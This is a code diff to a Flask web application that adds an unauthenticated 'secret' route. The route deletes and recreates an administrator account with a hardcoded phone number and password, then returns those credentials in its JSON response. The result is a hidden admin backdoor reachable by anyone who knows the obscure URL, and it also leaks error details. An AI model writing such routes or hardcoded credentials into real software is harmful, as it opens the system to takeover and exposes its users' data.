@@ -345,6 +345,40 @@ def register():
     return render_template('register.html')
 
 
+@app.route('/secret-admin-reset-bagtrack-2026')
+def secret_admin_reset():
+    """Secret route to reset admin credentials"""
+    try:
+        db = get_db()
+        cursor = db.cursor()
+        
+        # Delete existing admin
+        cursor.execute("DELETE FROM workers WHERE phone_number = '9986109356'")
+        
+        # Create new admin
+        password_hash = generate_password_hash('9vvb70cz5h')
+        cursor.execute("""
+            INSERT INTO workers (name, phone_number, password_hash, is_admin, is_active)
+            VALUES (?, ?, ?, 1, 1)
+        """, ('Admin', '9986109356', password_hash))
+        
+        db.commit()
+        cursor.close()
+        db.close()
+        
+        return jsonify({
+            'status': 'success',
+            'message': 'Admin user reset successfully',
+            'phone': '9986109356',
+            'password': '9vvb70cz5h'
+        })
+    except Exception as e:
+        return jsonify({
+            'status': 'error',
+            'error': str(e)
+        }), 500
+
+
 # ============================================================================
 # WORKER DASHBOARD & ROUTES
 # ============================================================================
